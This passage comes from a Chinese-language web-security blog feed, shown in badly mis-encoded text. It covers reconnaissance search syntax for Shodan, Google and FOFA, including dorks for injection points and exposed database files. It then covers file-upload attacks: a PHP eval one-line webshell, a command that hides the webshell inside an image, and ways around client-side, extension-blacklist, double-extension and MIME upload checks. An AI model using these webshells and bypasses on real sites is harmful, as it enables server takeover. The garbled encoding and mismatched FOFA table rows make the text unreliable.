å‡†ç¡®çš„æœç´¢å‡ºæˆ‘ä»¬æƒ³è¦çš„çš„å†…å®¹ï¼Œå¸¸è§çš„è¿‡æ»¤å‘½ä»¤å¦‚ä¸‹æ‰€ç¤ºï¼š</p><ul><li>hostnameï¼šæœç´¢æŒ‡å®šçš„ä¸»æœºæˆ–åŸŸåï¼Œä¾‹å¦‚ hostname:â€œgoogleâ€</li><li>portï¼šæœç´¢æŒ‡å®šçš„ç«¯å£æˆ–æœåŠ¡ï¼Œä¾‹å¦‚ port:â€œ22â€</li><li>countryï¼šæœç´¢æŒ‡å®šçš„å›½å®¶ï¼Œä¾‹å¦‚ country:â€œCNâ€</li><li>cityï¼šæœç´¢æŒ‡å®šçš„åŸå¸‚ï¼Œä¾‹å¦‚ city:â€œdalianâ€</li><li>orgï¼šæœç´¢æŒ‡å®šçš„ç»„ç»‡æˆ–å…¬å¸ï¼Œä¾‹å¦‚ org:â€œgoogleâ€</li><li>ispï¼šæœç´¢æŒ‡å®šçš„ISPä¾›åº”å•†ï¼Œä¾‹å¦‚ isp:â€œChina Telecomâ€</li><li>productï¼šæœç´¢æŒ‡å®šçš„æ“ä½œç³»ç»Ÿ/è½¯ä»¶/å¹³å°ï¼Œä¾‹å¦‚ product:â€œApache httpdâ€</li><li>versionï¼šæœç´¢æŒ‡å®šçš„è½¯ä»¶ç‰ˆæœ¬ï¼Œä¾‹å¦‚ version:â€œ1.6.2â€</li><li>geoï¼šæœç´¢æŒ‡å®šçš„åœ°ç†ä½ç½®ï¼Œå‚æ•°ä¸ºç»çº¬åº¦ï¼Œä¾‹å¦‚ geo:â€œ31.8639, 117.2808â€</li><li>before/afterï¼šæœç´¢æŒ‡å®šæ”¶å½•æ—¶é—´å‰åçš„æ•°æ®ï¼Œæ ¼å¼ä¸ºdd-mm-yyï¼Œä¾‹å¦‚ before:â€œ11-11-15â€</li><li>netï¼šæœç´¢æŒ‡å®šçš„IPåœ°å€æˆ–å­ç½‘ï¼Œä¾‹å¦‚ net:â€œ210.45.240.0/24â€</li></ul><h1 id="Googleæœç´¢å¼•æ“ä½¿ç”¨æ–¹æ³•"><a href="#Googleæœç´¢å¼•æ“ä½¿ç”¨æ–¹æ³•" class="headerlink" title="Googleæœç´¢å¼•æ“ä½¿ç”¨æ–¹æ³•"></a>Googleæœç´¢å¼•æ“ä½¿ç”¨æ–¹æ³•</h1><p><a href="https://www.google.com/">https://www.google.com/</a></p><p>å¸¸è§çš„ Google å…³é”®å­—</p><ul><li>siteï¼šæŒ‡å®šåŸŸå</li><li>inurlï¼šURLä¸­å­˜åœ¨å…³é”®å­—é¡µé¢</li><li>intextï¼šç½‘é¡µå†…å®¹é‡Œé¢çš„å…³é”®å­—</li><li>filetypeï¼šæŒ‡å®šæ–‡ä»¶ç±»å‹</li><li>intitleï¼šç½‘é¡µæ ‡é¢˜ä¸­çš„å…³é”®å­—</li><li>linkï¼šè¿”å›æ‰€æœ‰çš„æŒ‡å®šåŸŸåé“¾æ¥</li><li>infoï¼šæŸ¥æ‰¾æŒ‡å®šç«™ç‚¹ä¿¡æ¯</li><li>cacheï¼šæœç´¢Googleé‡Œçš„å†…å®¹ç¼“å­˜</li><li>-å…³é”®å­—ï¼šä¸å¸Œæœ›æœç´¢ç»“æœä¸­å‡ºç°åŒ…å«è¯¥å…³é”®å­—çš„ç½‘é¡µ</li></ul><p><strong>ç»„åˆä½¿ç”¨</strong></p><p>ä¸¾ä¾‹ï¼š</p><ol><li><p>åœ¨æŒ‡å®šç«™ç‚¹å¯»æ‰¾ä¸Šä¼ é¡µé¢<br><code>site: xx.com inurl: file</code><br><code>site: xx.com inurl: load</code></p></li><li><p>æœç´¢é‡è¦æ–‡ä»¶<br><code>site: xx.com inurl: robots.txt</code></p></li><li>æœç´¢æ³¨å…¥ç‚¹<br><code>inurl: php?id=</code></li><li>æœç´¢æ•æ„Ÿä¿¡æ¯<br><code>intitle: ç®¡ç†|ç™»å½•|åå°</code></li><li>æŸ¥è¯¢åŒ…å« <code>user.sql</code> ç”¨æˆ·æ•°æ®åº“ä¿¡æ¯çš„é¡µé¢<br><code>intext: user.sql intitle: index.of</code> (index.ofè¡¨ç¤ºç½‘ç«™ç›®å½•æ˜¯å¼€æ”¾çŠ¶æ€)</li></ol><p><strong>æ€»ç»“</strong></p><p><a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p><h1 id="FOFAæœç´¢å¼•æ“ä½¿ç”¨æ–¹æ³•"><a href="#FOFAæœç´¢å¼•æ“ä½¿ç”¨æ–¹æ³•" class="headerlink" title="FOFAæœç´¢å¼•æ“ä½¿ç”¨æ–¹æ³•"></a>FOFAæœç´¢å¼•æ“ä½¿ç”¨æ–¹æ³•</h1><p><a href="https://fofa.info/">FOFAç½‘ç»œç©ºé—´æµ‹ç»˜ç³»ç»Ÿ</a></p><blockquote><p>ç›´æ¥è¾“å…¥æŸ¥è¯¢è¯­å¥ï¼Œå°†ä»æ ‡é¢˜ï¼Œhtmlå†…å®¹ï¼Œhttpå¤´ä¿¡æ¯ï¼Œurlå­—æ®µä¸­æœç´¢ï¼›</p><p>å¦‚æœæŸ¥è¯¢è¡¨è¾¾å¼æœ‰å¤šä¸ªä¸æˆ–å…³ç³»ï¼Œå°½é‡åœ¨å¤–é¢ç”¨ï¼ˆï¼‰åŒ…å«èµ·æ¥ï¼›</p><p>æ–°å¢<code>==</code>å®Œå…¨åŒ¹é…çš„ç¬¦å·ï¼Œå¯ä»¥åŠ å¿«æœç´¢é€Ÿåº¦ï¼Œæ¯”å¦‚æŸ¥æ‰¾qq.comæ‰€æœ‰hostï¼Œå¯ä»¥æ˜¯domain==â€qq.comâ€</p></blockquote><h2 id="é«˜çº§æœç´¢"><a href="#é«˜çº§æœç´¢" class="headerlink" title="é«˜çº§æœç´¢"></a>é«˜çº§æœç´¢</h2><div class="table-container"><table><thead><tr><th>é€»è¾‘è¿æ¥ç¬¦</th><th>å…·ä½“å«ä¹‰</th></tr></thead><tbody><tr><td>=</td><td>åŒ¹é…ï¼Œ=â€â€æ—¶ï¼Œå¯æŸ¥è¯¢ä¸å­˜åœ¨å­—æ®µæˆ–è€…å€¼ä¸ºç©ºçš„æƒ…å†µã€‚</td></tr><tr><td>==</td><td>å®Œå…¨åŒ¹é…ï¼Œ==â€â€æ—¶ï¼Œå¯æŸ¥è¯¢å­˜åœ¨ä¸”å€¼ä¸ºç©ºçš„æƒ…å†µã€‚</td></tr><tr><td>&amp;&amp;</td><td>ä¸</td></tr><tr><td>\</td><td>\</td><td></td><td>æˆ–è€…</td></tr><tr><td>!=</td><td>ä¸åŒ¹é…ï¼Œ!=â€â€æ—¶ï¼Œå¯æŸ¥è¯¢å€¼ä¸ºç©ºçš„æƒ…å†µã€‚</td></tr><tr><td>*=</td><td>æ¨¡ç³ŠåŒ¹é…ï¼Œä½¿ç”¨<em>æˆ–è€…?è¿›è¡Œæœç´¢ï¼Œæ¯”å¦‚banner</em>=â€mys??â€ (ä¸ªäººç‰ˆåŠä»¥ä¸Šå¯ç”¨)ã€‚</td></tr><tr><td>()</td><td>ç¡®è®¤æŸ¥è¯¢ä¼˜å…ˆçº§ï¼Œæ‹¬å·å†…å®¹ä¼˜å…ˆçº§æœ€é«˜ã€‚</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>ä¾‹å¥</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>title=â€beijingâ€</td><td>ä»æ ‡é¢˜ä¸­æœç´¢â€œåŒ—äº¬â€</td></tr><tr><td>header=â€elasticâ€</td><td>ä»httpå¤´ä¸­æœç´¢â€œelasticâ€</td></tr><tr><td>body=â€ç½‘ç»œç©ºé—´æµ‹ç»˜â€</td><td>ä»htmlæ­£æ–‡ä¸­æœç´¢â€œç½‘ç»œç©ºé—´æµ‹ç»˜â€</td></tr><tr><td>fid=â€sSXXGNUO2FefBTcCLIT/2Q==â€</td><td>æŸ¥æ‰¾ç›¸åŒçš„ç½‘ç«™æŒ‡çº¹</td></tr><tr><td>domain=â€qq.comâ€</td><td>æœç´¢æ ¹åŸŸåå¸¦æœ‰qq.comçš„ç½‘ç«™</td></tr><tr><td>icp=â€äº¬ICPè¯030173å·â€</td><td>æŸ¥æ‰¾å¤‡æ¡ˆå·ä¸ºâ€œäº¬ICPè¯030173å·â€çš„ç½‘ç«™</td></tr><tr><td>js_name=â€js/jquery.jsâ€</td><td>æŸ¥æ‰¾ç½‘ç«™æ­£æ–‡ä¸­åŒ…å«js/jquery.jsçš„èµ„äº§</td></tr><tr><td>cname=â€ap21.inst.siteforce.comâ€</td><td>æŸ¥æ‰¾cnameä¸ºâ€ap21.inst.siteforce.comâ€çš„ç½‘ç«™</td></tr><tr><td>cname_domain=â€siteforce.comâ€</td><td>æŸ¥æ‰¾cnameä¸ºâ€ap21.inst.siteforce.comâ€çš„ç½‘ç«™</td></tr><tr><td>cname_domain=â€siteforce.comâ€</td><td>ä»urlä¸­æœç´¢â€.gov.cnâ€</td></tr><tr><td>port=â€6379â€</td><td>port=â€6379â€</td></tr><tr><td>ip=â€1.1.1.1â€</td><td>ä»ipä¸­æœç´¢åŒ…å«â€œ1.1.1.1â€çš„ç½‘ç«™</td></tr><tr><td>status_code=â€402â€</td><td>æŸ¥è¯¢æœåŠ¡å™¨çŠ¶æ€ä¸ºâ€œ402â€çš„èµ„äº§</td></tr><tr><td>æŸ¥è¯¢æœåŠ¡å™¨çŠ¶æ€ä¸ºâ€œ402â€çš„èµ„äº§</td><td>æŸ¥è¯¢æœåŠ¡å™¨çŠ¶æ€ä¸ºâ€œ402â€çš„èµ„äº§</td></tr><tr><td>city=â€ÃœrÃ¼mqiâ€</td><td>æœç´¢æŒ‡å®šåŸå¸‚çš„èµ„äº§</td></tr><tr><td>after=â€2017â€ &amp;&amp; before=â€2017-10-01â€</td><td>æ—¶é—´èŒƒå›´æ®µæœç´¢</td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¿¡æ¯æœé›† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ </title>
      <link href="/2023/07/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/07/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="WebShell-ä¸-WebShell-ç®¡ç†å·¥å…·"><a href="#WebShell-ä¸-WebShell-ç®¡ç†å·¥å…·" class="headerlink" title="WebShell ä¸ WebShell ç®¡ç†å·¥å…·"></a>WebShell ä¸ WebShell ç®¡ç†å·¥å…·</h1><h2 id="ä»€ä¹ˆå«åšWebShell"><a href="#ä»€ä¹ˆå«åšWebShell" class="headerlink" title="ä»€ä¹ˆå«åšWebShell"></a>ä»€ä¹ˆå«åšWebShell</h2><ul><li>WebShell , ç®€ç§°ç½‘é¡µåé—¨ã€‚ç®€å•æ¥è¯´å®ƒæ˜¯è¿è¡Œåœ¨Webåº”ç”¨ä¹‹ä¸Šçš„è¿œç¨‹æ§åˆ¶ç¨‹åº</li><li>webShellå…¶å®å°±æ˜¯ä¸€å¼ ç½‘é¡µï¼Œç”±PHPã€JSPã€ASPã€ASP.NETç­‰è¿™ç±»webåº”ç”¨ç¨‹åºè¯­è¨€å¼€å‘ï¼Œä½†webShellå¹¶ä¸å…·å¤‡å¸¸è§ç½‘é¡µçš„åŠŸèƒ½ï¼Œä¾‹å¦‚ç™»å½•ã€æ³¨å†Œã€ä¿¡æ¯å±•ç¤ºç­‰åŠŸèƒ½ï¼Œä¸€èˆ¬ä¼šå…·å¤‡æ–‡ä»¶ç®¡ç†ã€ç«¯å£æ‰«æã€ææƒã€è·å–ç³»ç»Ÿä¿¡æ¯ç­‰åŠŸèƒ½</li></ul><p><strong>å¸¸è§çš„WebShellæœ‰å“ªäº›ï¼Ÿ</strong></p><ul><li>å¤§é©¬ã€å°é©¬ã€å„ç§é©¬â€¦ç­‰</li><li>æ‹¥æœ‰è¾ƒå®Œæ•´åŠŸèƒ½çš„webshellï¼Œæˆ‘ä»¬ä¸€èˆ¬ç§°ä¸º<code>å¤§é©¬</code>ã€‚</li><li>åŠŸèƒ½ç®€æ˜“çš„webshellç§°ä¸º<code>å°é©¬</code>ã€‚</li><li>é™¤æ­¤ä¹‹å¤–è¿˜å­˜åœ¨<code>ä¸€å¥è¯æœ¨é©¬ã€èœåˆ€é©¬ã€è„±åº“é©¬</code>ç­‰ç­‰çš„åè¯ï¼Œæ˜¯å¯¹äºwebShellåŠŸèƒ½æˆ–è€…ç‰¹æ€§çš„ç®€ç§°</li></ul><p><strong>ä¸€å¥è¯æœ¨é©¬ç‰¹ç‚¹</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä»£ç çŸ­ï¼Œåªæœ‰ä¸€è¡Œä»£ç ã€‚</span><br><span class="line">åœºæ™¯å¤šï¼Œå¯ä»¥å•ç‹¬ç”Ÿæˆæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ’å…¥åˆ°å›¾ç‰‡ä¸­ã€‚</span><br><span class="line">å®‰å…¨æ€§é«˜ï¼ŒéšåŒ¿æ€§å¼ºï¼Œå¯å˜å½¢å…æ€</span><br></pre></td></tr></table></figure><p><strong>å°é©¬ç‰¹ç‚¹</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">èƒ½æ”¾æ–‡ä»¶çš„ç½‘ç«™æˆ‘ä»¬å¯ä»¥åœ¨æœ¨é©¬ä¸­æ·»åŠ æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½</span><br><span class="line">ä½“ç§¯å°ï¼ŒåŠŸèƒ½å°‘</span><br><span class="line">åªæœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½</span><br></pre></td></tr></table></figure><p><strong>å¤§é©¬ç‰¹ç‚¹</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ä½“ç§¯å¤§ï¼ŒåŠŸèƒ½å…¨ã€‚èƒ½å¤Ÿç®¡ç†æ•°æ®åº“ã€æ–‡ä»¶ç®¡ç†ã€</span><br><span class="line">å¯¹ç«™ç‚¹è¿›è¡Œå¿«é€Ÿçš„ä¿¡æ¯æ”¶é›†ï¼Œç”šè‡³èƒ½å¤Ÿææƒã€‚</span><br></pre></td></tr></table></figure><h2 id="ä¸€å¥è¯æœ¨é©¬è§£è¯»"><a href="#ä¸€å¥è¯æœ¨é©¬è§£è¯»" class="headerlink" title="ä¸€å¥è¯æœ¨é©¬è§£è¯»"></a>ä¸€å¥è¯æœ¨é©¬è§£è¯»</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>$_POST[x]</code>  è·å– POSTè¯·æ±‚å‚æ•°ä¸­Xçš„ï¼Œä¾‹å¦‚POSTè¯·æ±‚ä¸­ä¼ é€’<code>x=phpinfo();</code>ï¼Œé‚£ä¹ˆ<code>$_POST[x]</code>å°±ç­‰åŒäº<code>phpinfo();</code></li><li><code>eval()</code> å°†å­—ç¬¦ä¸²å½“åšPHPä»£ç å»æ‰§è¡Œï¼Œä¾‹å¦‚<code>eval(&#39;phpinfo();&#39;)</code>ï¼Œå…¶ä¸­<code>phpinfo();</code>ä¼šè¢«å½“åšPHPä»£ç å»æ‰§è¡Œã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]); <span class="meta">?&gt;</span>   å®é™…ä¸Šçš„ä¼ é€’è¿‡ç¨‹æ˜¯è¿™æ ·çš„</span><br><span class="line">â†“</span><br><span class="line">â†“</span><br><span class="line">â†“</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="meta">?&gt;</span> å®é™…çš„è¯­å¥æ˜¯è¿™æ ·çš„ </span><br></pre></td></tr></table></figure><ul><li>æˆ‘ä»¬é€šè¿‡è¯¥<code>webshell</code>ï¼Œä¼ é€’<code>ä»»æ„PHPä»£ç </code>ï¼Œè®©å…¶å»æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°<code>ä»»æ„ä»£ç æ‰§è¡Œ</code></li><li>é”™è¯¯æ§åˆ¶è¿ç®—ç¬¦ï¼Œå½“å°† <code>@</code>æ”¾ç½®åœ¨ä¸€ä¸ªPHPè¡¨è¾¾å¼ä¹‹å‰ï¼Œè¯¥è¡¨è¾¾å¼å¯èƒ½äº§ç”Ÿçš„ä»»ä½•é”™è¯¯ä¿¡æ¯éƒ½è¢« <code>å¿½ç•¥</code>æ‰</li></ul><h2 id="WebShell-ç®¡ç†å·¥å…·"><a href="#WebShell-ç®¡ç†å·¥å…·" class="headerlink" title="WebShell ç®¡ç†å·¥å…·"></a>WebShell ç®¡ç†å·¥å…·</h2><p><strong>å¸¸ç”¨ WebShell ç®¡ç†å·¥å…·</strong></p><ul><li>ä¸­å›½èœåœ°</li><li>ä¸­å›½èšå‰‘</li><li>å†°è</li><li>å“¥æ–¯æ‹‰</li><li>â€¦</li></ul><p><strong>èšå‰‘</strong></p><p><code>weevely</code> å‘½ä»¤è¡Œå·¥å…·ï¼Œkaliè‡ªå¸¦ï¼Œå¯ä»¥è‡ªå·±ç”Ÿæˆä¸€å¥è¯æœ¨é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely ç›®æ ‡url å¯†ç </span><br></pre></td></tr></table></figure><p><strong>å†°è</strong></p><p>åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†ç½‘ç«™ç®¡ç†å®¢æˆ·ç«¯ï¼Œè‡ªå¸¦å¤šä¸ªä¸€å¥è¯æœ¨é©¬</p><p><strong>å“¥æ–¯æ‹‰</strong></p><p>éœ€è¦Javaç¯å¢ƒï¼Œéœ€è¦è‡ªå·±ç”Ÿæˆä¸€å¥è¯æœ¨é©¬ï¼ŒåŠ å¯†æµé‡ï¼Œå¯ç»•è¿‡å¤šç§wafå’Œé™æ€æ‹¦æˆªç­‰</p><p>å¯†ç å¯†é’¥é»˜è®¤ï¼Œæœ‰æ•ˆè½½è·å°±æ˜¯éœ€è¦ç”Ÿæˆä»€ä¹ˆç¯å¢ƒçš„æœ¨é©¬ï¼Œæœ‰åŠ å¯†æ–¹å¼ï¼Œå¯ç”¨base64ï¼Œå¼‚æˆ–ç­‰</p><p>å·¥å…·åœ¨è¿æ¥æ—¶å¯ä»¥æ·»åŠ cookieå€¼ä»¥å®Œæˆç›¸å…³ç”¨æˆ·æ ¡éªŒ</p><h2 id="å›¾ç‰‡é©¬"><a href="#å›¾ç‰‡é©¬" class="headerlink" title="å›¾ç‰‡é©¬"></a>å›¾ç‰‡é©¬</h2><blockquote><ol><li>åœ¨è·¯å¾„ä¸‹å‡†å¤‡å¥½ä¸€å¥è¯æœ¨é©¬.phpå’Œä¸€å¼ å›¾ç‰‡ .png (æˆ–è€… .jpg )</li><li>è¾“å…¥ç³»ç»ŸæŒ‡ä»¤ï¼š <code>copy ä¸€å¼ å›¾ç‰‡.png/b+ä¸€å¥è¯æœ¨é©¬.php/a ç”Ÿæˆå›¾ç‰‡åç§°.png</code></li><li>è¿™æ ·å›¾ç‰‡æœ¨é©¬å°±åˆæˆå¥½äº†</li></ol></blockquote><h1 id="æ–‡ä»¶ä¸Šä¼ ä¹‹æ³¨å…¥æµç¨‹"><a href="#æ–‡ä»¶ä¸Šä¼ ä¹‹æ³¨å…¥æµç¨‹" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ ä¹‹æ³¨å…¥æµç¨‹"></a>æ–‡ä»¶ä¸Šä¼ ä¹‹æ³¨å…¥æµç¨‹</h1><ul><li>æ‰¾åˆ°ä¸Šä¼ çš„åŠŸèƒ½ï¼Œæ²¡æœ‰çš„è¯å¯ä»¥é€šè¿‡æ•°æ®åº“æ¯”å¦‚redisæœªæˆæƒå’ŒæŒä¹…åŒ–æœºåˆ¶KVå†™å…¥æœ¨é©¬ï¼ŒMySQLçš„è¯»å†™æœºåˆ¶å†™å…¥æœ¨é©¬</li><li>è‡ªåŠ¨æ‰¾åˆ°ç½‘ç«™ä¸­æ–‡ä»¶ä¸Šä¼ çš„ç‚¹ï¼š<a href="https://github.com/almandin/fuxploider">https://github.com/almandin/fuxploider</a></li><li>å°è¯•ç»•è¿‡æ ¡éªŒï¼Œä¸Šä¼ æ–‡ä»¶</li><li>è·å¾—æ–‡ä»¶ä½ç½®</li><li>èšå‰‘è¿æ¥ï¼Œç®¡ç†æ–‡ä»¶</li></ul><h1 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´ç»•è¿‡"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´ç»•è¿‡" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´ç»•è¿‡"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´ç»•è¿‡</h1><h2 id="å®¢æœç«¯ç»•è¿‡"><a href="#å®¢æœç«¯ç»•è¿‡" class="headerlink" title="å®¢æœç«¯ç»•è¿‡"></a>å®¢æœç«¯ç»•è¿‡</h2><p><strong>ï¼ˆ1ï¼‰å®¢æˆ·ç«¯æ ¡éªŒ:</strong></p><p>ä¸€èˆ¬éƒ½æ˜¯åœ¨ç½‘é¡µä¸Šå†™ä¸€æ®µ javascript è„šæœ¬ï¼Œæ ¡éªŒä¸Šä¼ æ–‡ä»¶çš„åç¼€åï¼Œæœ‰ç™½åå•å½¢å¼ä¹Ÿæœ‰é»‘åå•å½¢å¼ã€‚åˆ¤æ–­æ–¹å¼ï¼šåœ¨æµè§ˆåŠ è½½æ–‡ä»¶ï¼Œä½†è¿˜æœªç‚¹å‡»ä¸Šä¼ æŒ‰é’®æ—¶ä¾¿å¼¹å‡ºå¯¹è¯æ¡†ï¼Œå†…å®¹å¦‚ï¼šåªå…è®¸ä¸Šä¼ <code>.jpg/.jpeg/.png</code>åç¼€åçš„æ–‡ä»¶ï¼Œè€Œæ­¤æ—¶å¹¶æ²¡æœ‰å‘é€æ•°æ®åŒ…ã€‚</p><p><strong>ï¼ˆ2ï¼‰ç»•è¿‡æ–¹æ³•:</strong></p><p>1.é€šè¿‡ç«ç‹æ’ä»¶ NOscript æ’ä»¶æˆ–è€…ç¦ç”¨ IE ä¸­ JS è„šæœ¬ï¼›</p><p>2.é€šè¿‡ firbug æ’ä»¶å…ƒç´ å®¡æ ¸ä¿®æ”¹ä»£ç ï¼ˆå¦‚åˆ é™¤ <code>onsubmit=&quot;return checkFile()&quot;</code> äº‹ä»¶ï¼‰ï¼›</p><p>3.é€šè¿‡ firbug å…ƒç´ å®¡æ ¸ javascirpt è„šæœ¬ä¸­æ·»åŠ ä¸Šä¼ æ–‡ä»¶ç±»å‹ï¼›</p><p>4.é€šè¿‡åˆ©ç”¨ burp æŠ“åŒ…æ”¹åŒ…ï¼Œå…ˆä¸Šä¼ ä¸€ä¸ª gif ç±»å‹çš„æœ¨é©¬ï¼Œç„¶åé€šè¿‡ burp å°†å…¶æ”¹ä¸º<code>asp/php/jsp</code> åç¼€åå³å¯ æ³¨æ„ï¼šè¿™é‡Œä¿®æ”¹æ–‡ä»¶åå­—åï¼Œè¯·æ±‚å¤´ä¸­çš„ <code>Content-Length</code> çš„å€¼ä¹Ÿè¦æ”¹ã€‚</p><h2 id="æœåŠ¡ç«¯ç»•è¿‡"><a href="#æœåŠ¡ç«¯ç»•è¿‡" class="headerlink" title="æœåŠ¡ç«¯ç»•è¿‡"></a>æœåŠ¡ç«¯ç»•è¿‡</h2><p><strong>ï¼ˆ1ï¼‰é»‘åå•æ‰©å±•åç»•è¿‡</strong></p><p>é»‘åå•æ£€æµ‹ï¼šä¸€èˆ¬æœ‰ä¸ªä¸“é—¨çš„ blacklist æ–‡ä»¶ï¼Œé‡Œé¢ä¼šåŒ…å«å¸¸è§çš„å±é™©è„šæœ¬æ–‡ä»¶ã€‚</p><p>ç»•è¿‡æ–¹æ³•ï¼š</p><ul><li>æ‰¾é»‘åå•æ‰©å±•åçš„æ¼ç½‘ä¹‹é±¼ - æ¯”å¦‚ iis6.0 ä¸­çš„ asa å’Œ cer </li><li>å¯èƒ½å­˜åœ¨å¤§å°å†™ç»•è¿‡æ¼æ´ - æ¯”å¦‚ aSp(iis6.0 ä¸­å¯ä»¥ï¼‰å’Œ pHpï¼ˆåªèƒ½åœ¨ å°äº php5.3.39 ä¸­çš„ linux ä¸­ï¼‰ä¹‹ä¸­</li><li>èƒ½è¢«webå®¹å™¨è§£æçš„æ–‡ä»¶å…¶ä»–æ‰©å±•ååˆ—è¡¨ï¼š</li></ul><blockquote><p>jsp, jspx ,jspf</p><p>asp asa cer cdx,htr,xml,html</p><p>aspx,ashx,asmx,asax,ascx</p></blockquote><p><strong>ï¼ˆ2ï¼‰é»‘åå•ç‰¹æ®Šåç¼€åç»•è¿‡ï¼ˆåˆ©ç”¨éš¾åº¦é«˜ï¼‰</strong></p><p>å°†Burpsuiteæˆªè·çš„æ•°æ®åŒ…ä¸­<code>backlion.php</code>åå­—æ”¹ä¸º <code>baclion.php4(php1,php2,php3,php4,php5)</code>, å‰ææ¡ä»¶æ˜¯ <code>http.conf</code> ä¸­è®¾ç½® <code>AddType application/x-httpd-php .php1(php çš„ç‰ˆæœ¬å°äºç­‰äº 5.3.29 ä»¥ä¸‹)</code></p><p><strong>ï¼ˆ3ï¼‰å•åŒé‡åç¼€åç»•è¿‡</strong></p><p>ä¸Šä¼ æ—¶å°† Burpsuite æˆªçš„æ•°æ®åŒ…ä¸­æ–‡ä»¶å<code>backlion.phpï¼ˆbacklion.asa)</code>æ”¹ ä¸º <code>backlion.pphphph(backlion.asasaa)</code>ï¼Œé‚£ä¹ˆè¿‡æ»¤äº†ç¬¬ä¸€ä¸ªâ€phpâ€å­—ç¬¦ä¸²â€åï¼Œ å¼€å¤´çš„â€™pâ€™å’Œç»“å°¾çš„â€™hpâ€™å°±ç»„åˆåˆå½¢æˆäº† php</p><p><strong>ï¼ˆ4ï¼‰æœåŠ¡ç«¯ MIME æ–‡ä»¶ç±»å‹(Content-Type)ç»•è¿‡</strong></p><p>MIME çš„ä½œç”¨ï¼š</p><p>ä½¿å®¢æˆ·ç«¯è½¯ä»¶ï¼ŒåŒºåˆ†ä¸åŒç§ç±»çš„æ•°æ®ï¼Œä¾‹å¦‚webæµè§ˆå™¨å°±æ˜¯é€šè¿‡ MIME ç±» å‹æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯GIFå›¾ç‰‡ï¼Œè¿˜æ˜¯å¯æ‰“å°çš„ PostScript æ–‡ä»¶ã€‚webæœåŠ¡å™¨ä½¿ç”¨ MIME æ¥è¯´æ˜å‘é€æ•°æ®çš„ç§ç±»ï¼Œwebå®¢æˆ·ç«¯ä½¿ç”¨ MIME æ¥è¯´æ˜å¸Œæœ›æ¥æ”¶åˆ°çš„æ•°æ®ç§ç±»ï¼Œå®ƒæ˜¯æœåŠ¡å™¨ç”¨æ¥åˆ¤æ–­æµè§ˆå™¨ä¼ é€’æ–‡ä»¶æ ¼å¼çš„é‡è¦æ ‡è®°é¡¹</p><p>å¸¸ç”¨çš„æ–‡ä»¶ä¸Šä¼ ç±»å‹çš„ MIME è¡¨ï¼š</p><blockquote><p> text/plainï¼ˆçº¯æ–‡æœ¬ï¼‰ text/htmlï¼ˆHTML æ–‡æ¡£ï¼‰ text/javascriptï¼ˆjs ä»£ç ï¼‰ application/xhtml+xmlï¼ˆXHTML æ–‡æ¡£ï¼‰ image/gifï¼ˆGIF å›¾åƒï¼‰ image/jpegï¼ˆJPEG å›¾åƒï¼‰ image/pngï¼ˆPNG å›¾åƒï¼‰ video/mpegï¼ˆMPEG åŠ¢ç”»ï¼‰ application/octet-streamï¼ˆäºŒè¿šåˆ¶æ•°æ®ï¼‰ application/pdfï¼ˆPDF æ–‡æ¡£ï¼‰ application/(ç¼–ç¨‹è¯­è¨€) è¯¥ç§è¯­è¨€çš„ä»£ç  application/mswordï¼ˆMicrosoft Word æ–‡ä»¶ï¼‰ message/rfc822ï¼ˆRFC 822 å½¢å¼ï¼‰ multipart/alternativeï¼ˆHTML é‚®ä»¶çš„ HTML å½¢å¼å’Œçº¯æ–‡æœ¬å½¢å¼ï¼Œç›¸åŒå†…å®¹ä½¿ ç”¨ä¸åŒå½¢å¼è¡¨ç¤ºï¼‰ application/x-www-form-urlencodedï¼ˆPOST æ–¹æ³•æäº¤çš„è¡¨å•ï¼‰multipart/form-dataï¼ˆPOST æäº¤æ—¶ä¼´éšæ–‡ä»¶ä¸Šä¼ çš„è¡¨å•ï¼‰</p></blockquote><p>ç»•è¿‡æ–¹æ³•ï¼šä¸Šä¼ å¯¹æ–‡ä»¶ç±»å‹åšäº†é™åˆ¶ï¼Œå¯é€šè¿‡ burpsuit å°†å…¶ä»–ç±»æ–‡ä»¶ç±»å‹ 